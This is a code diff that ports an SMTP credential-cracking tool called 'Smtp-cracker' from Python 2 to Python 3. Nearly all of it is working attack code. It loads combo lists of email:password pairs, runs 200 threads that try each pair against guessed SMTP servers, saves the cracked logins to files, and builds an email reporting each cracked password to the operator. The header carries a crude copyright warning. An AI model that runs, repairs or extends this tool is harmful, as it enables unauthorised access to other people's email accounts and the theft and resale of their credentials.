@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 #Coded By ARON-TN
 #Don't Change copyright Mother Fucker :)
@@ -18,45 +18,49 @@ for i in msg0:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
-try: 
- import Queue
-except:
-  print"\033[91m[\033[92m?\033[91m] Installing Queue Module\033[00m"
-  if os.name=='nt':
-    try:
-      os.system('C:\Python27\Scripts\pip2.exe install Queue')
-      import Queue
-    except:
-      print "Install Python-Pip Sir"
-      raw_input('')
-  else:
-    try:
-      os.system('pip2 install Queue')
-      import Queue
-    except:
-      print "\033[91mTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install Queue'\033[00m"
+# try:
+#  import Queue
+# except:
+#   print("\033[91m[\033[92m?\033[91m] Installing Queue Module\033[00m")
+#   if os.name=='nt':
+#     try:
+#       os.system('C:\Python27\Scripts\pip2.exe install Queue')
+#       import Queue
+#     except:
+#       print("Install Python-Pip Sir")
+#       input('')
+#   else:
+#     try:
+#       os.system('pip2 install Queue')
+#       import Queue
+#     except:
+#       print("\033[91mTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install Queue'\033[00m")
+
+import queue
+
 try:
  import requests
 except:
-  print"\033[91m[\033[92m?\033[91m] Installing requests Module\033[00m"
+  print("\033[91m[\033[92m?\033[91m] Installing requests Module\033[00m")
   if os.name=='nt':
     try:
-      os.system('C:\Python27\Scripts\pip2.exe install requests')
+      os.system('pip install requests')
     except:
-      print "Install Python-Pip Sir"
-      raw_input('')
+      print("Install Python-Pip Sir")
+      input('')
   else:
-    os.system('pip2 install requests')
+    os.system('pip install requests')
+import requests
 try:
  import colorama
 except:
-  print"\033[91m[\033[92m?\033[91m] Installing colorama Module\033[00m"
+  print("\033[91m[\033[92m?\033[91m] Installing colorama Module\033[00m")
   if os.name=='nt':
     try:
-      os.system('C:\Python27\Scripts\pip2.exe install colorama')
+      os.system('pip install colorama')
     except:
-      print "Install Python-Pip Sir"
-      raw_input('')
+      print("Install Python-Pip Sir")
+      input('')
   else:
     os.system('pip2 install colorama')
 msg00 ="\n\033[92m##### GOOd Now You have all modules #####\n\033[0;96m############## Let's start ##############\033[92m\n"
@@ -69,13 +73,13 @@ def aron():
   if os.name=='nt':
    os.system('cls && cd Smtp-cracker && smtp.py')
   else:
-   os.system('clear && cd Smtp-cracker && python2 smtp.py')
+   os.system('clear && cd Smtp-cracker && python3 smtp.py')
  except:
     print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
 to_check={}
 from colorama import *
 init()
-print '\033[1m'
+print('\033[1m')
 class IMAP4_SSL(imaplib.IMAP4_SSL):
     def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
                  certfile=None, ssl_version=None, ca_certs=None, 
@@ -120,7 +124,7 @@ class checkerr(threading.Thread):
 			i.login(self.user,self.pwd)
 			self.i=i
 			self.connected=True
-		except Exception,e:
+		except Exception as e:
 			i.close()
 			self.connected=False
 	def find(self):
@@ -173,7 +177,7 @@ class checkerr(threading.Thread):
 			if k not in found:
 				new.append(v)
 		to_check=new
-		print '\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[97m '+to_check+'\n'
+		print('\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[97m '+to_check+'\n')
 	def run(self):
 		global to_checks
 		while self.work:
@@ -219,7 +223,7 @@ class consumer(threading.Thread):
 			bads.append(ip)
 		return -1
 	def findHost(self,host):
-		print '\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on \033[97m'+host+'\n'
+		print('\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on \033[97m'+host+'\n')
 		global cache,bads,rbads
 		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		s.setblocking(0)
@@ -231,7 +235,7 @@ class consumer(threading.Thread):
 					s=ssl.wrap_socket(s)
 				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
 				return s
-			except Exception,e:
+			except Exception as e:
 				if rbads:
 					bads.append(host)
 				return None
@@ -240,7 +244,7 @@ class consumer(threading.Thread):
 		cache[host]=[-1,-1]
 		for i,p in enumerate(self.ports):
 			for j,h in enumerate(self.hosts):
-				print '\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[97m '+h+host+':'+str(p)+'\n'
+				print('\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[97m '+h+host+':'+str(p)+'\n')
 				try:
 					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 					s.setblocking(0)
@@ -250,7 +254,7 @@ class consumer(threading.Thread):
 					s.connect((h+host,p))
 					cache[host]=[j,i]
 					return s
-				except Exception,e:
+				except Exception as e:
 					continue
 		bads.append(host)
 		del cache[host]
@@ -282,7 +286,7 @@ class consumer(threading.Thread):
 				i=int(h)
 				p=passw.replace('%part'+str(i)+'%',parts[i-1])
 				return p
-			except Exception,e:
+			except Exception as e:
 				return None
 		return passw
 	def connect(self,tupple,ssl=False):
@@ -307,7 +311,7 @@ class consumer(threading.Thread):
 		if port=="465":
 			port+="(SSL)"
 		host=self.hosts[cache[host][0]]+host
-		print '\033[91m[\033[92m*\033[91m]\033[92mTrying > \033[97m'+host+":"+port+":"+user+":"+passw+'\n'
+		print('\033[91m[\033[92m*\033[91m]\033[92mTrying > \033[97m'+host+":"+port+":"+user+":"+passw+'\n')
 		try:
 			banner=s.recv(1024)
 			if banner[0:3]!="220":
@@ -330,7 +334,7 @@ class consumer(threading.Thread):
 				self.sendCmd(s,'QUIT')
 				s.close()
 				return 0
-   			print '\n\033[93m[\033[90m>\033[00m]\033[91m B000M Cracked >\033[97m '+host+':'+port+' '+user+' '+passw+'\n'
+			print('\n\033[93m[\033[90m>\033[00m]\033[91m B000M Cracked >\033[97m '+host+':'+port+' '+user+' '+passw+'\n')
 			save=open('cracked_smtps.txt','a').write(host+":"+port+","+user+","+passw+"\n")
 			save=open('cracked_Mailaccess.txt','a').write(user+":"+passw+"\n")
 			cracked.append(host1)
@@ -378,7 +382,7 @@ class consumer(threading.Thread):
 		<font color="black" size="5" ><font color="red">Password :</font> '''+passw+'''<br><br></font>
 		<center><img src="http://lh6.googleusercontent.com/-AXuIH_cHGOQ/UUzEKLtQ0EI/AAAAAAAAAGI/jw2FhilfMo4/s298-no/TrollFaceDancing_large.gif"/>
 		</center><br><br><br>
-		<font color="black" size="5" ><font color="red">Email :</font> aron.tn.official@gmail.com <br><br></font>
+		<font color="black" size="5" ><font color="red">Email :</font> Mr_Aron@protonmail.ch <br><br></font>
 		<font color="black" size="5" ><font color="red">Youtube :</font> <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><br></font>
 		<h2>© ARON-TN 2017-2019</h2>
 	</body>
@@ -388,7 +392,7 @@ class consumer(threading.Thread):
 			
 			self.sendCmd(s,'QUIT')
 			s.close()
-		except Exception,e:
+		except Exception as e:
 			s.close()
 			return self.addBad(host1)
 	def run(self):
@@ -398,7 +402,7 @@ class consumer(threading.Thread):
 			self.q.task_done()
 randomString = uuid.uuid4().hex
 randomString = randomString.upper()[0:7]
-quee=Queue.Queue(maxsize=20000)
+quee=queue.Queue(maxsize=20000)
 try:
  os.remove('about.txt')
 except:
@@ -430,34 +434,34 @@ for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
-if vers=='2.1':
-  print('{>} Good You have last version \n')
-else:
- print("\033[91mThere is New Version available !! Do you Want To Update Your tool ? \033[00m")
- ok=raw_input('''
-   \033[91m[\033[94m1\033[91m]\033[00m YEs
-   \033[91m[\033[94m2\033[91m]\033[00m No
-  \033[91m[\033[94m>\033[91m]\033[00m : ''')
- if ok=='1':
-  aroon ="\n Update Strated !\n"
-  for i in aroon:
-   sys.stdout.write(i)
-   sys.stdout.flush()
-   time.sleep(0.02)
-  os.remove(sys.argv[0])
-  os.system('git clone https://github.com/aron-tn/Smtp-cracker && cd Smtp-cracker')
-  if os.name=='nt':
-   os.system('cls')
-  else:
-   os.system('clear')
-  os.system('smtp.py')
- elif ok=='2':
-  pass
+# if vers=='2.1':
+#   print('{>} Good You have last version \n')
+# else:
+#  print("\033[91mThere is New Version available !! Do you Want To Update Your tool ? \033[00m")
+#  ok=input('''
+#    \033[91m[\033[94m1\033[91m]\033[00m YEs
+#    \033[91m[\033[94m2\033[91m]\033[00m No
+#   \033[91m[\033[94m>\033[91m]\033[00m : ''')
+#  if ok=='1':
+#   aroon ="\n Update Strated !\n"
+#   for i in aroon:
+#    sys.stdout.write(i)
+#    sys.stdout.flush()
+#    time.sleep(0.02)
+#   os.remove(sys.argv[0])
+#   os.system('git clone https://github.com/aron-tn/Smtp-cracker && cd Smtp-cracker')
+#   if os.name=='nt':
+#    os.system('cls')
+#   else:
+#    os.system('clear')
+#   os.system('smtp.py')
+#  elif ok=='2':
+#   pass
 try:
-  inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m'),'r').read().splitlines()
+  inputs=open(input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m'),'r').read().splitlines()
 except:
 	sys.exit("\n\033[91m{!} Your File not Founded\033[00m")
-email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email :\033[97m ')
+email=input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email :\033[97m ')
 thret=200
 def part():
 	global tld,tlds
@@ -466,23 +470,23 @@ def part():
 part()
 msg ="\n\033[91mConnecting ..........."
 for i in msg:
-        sys.stdout.write(i)
-        sys.stdout.flush()
-        time.sleep(0.2)
+		sys.stdout.write(i)
+		sys.stdout.flush()
+		time.sleep(0.2)
 for i in range(int(thret)):
-    try:
-        t=consumer(quee)
-        t.setDaemon(True)
-        t.start()
-    except:
-		print "\033[91m{!} Working only with %s threads\033[00m"%i
+	try:
+		t=consumer(quee)
+		t.setDaemon(True)
+		t.start()
+	except:
+		print("\033[91m{!} Working only with %s threads\033[00m"%i)
 		break
 try:
-    for i in inputs:
-        user = i.split(':')[0]
-        password = i.split(':')[1]
-        user = user.lower()
-        quee.put((user.split('@')[1], user, password))
+	for i in inputs:
+		user = i.split(':')[0]
+		password = i.split(':')[1]
+		user = user.lower()
+		quee.put((user.split('@')[1], user, password))
 except:
 	pass
 quee.join()
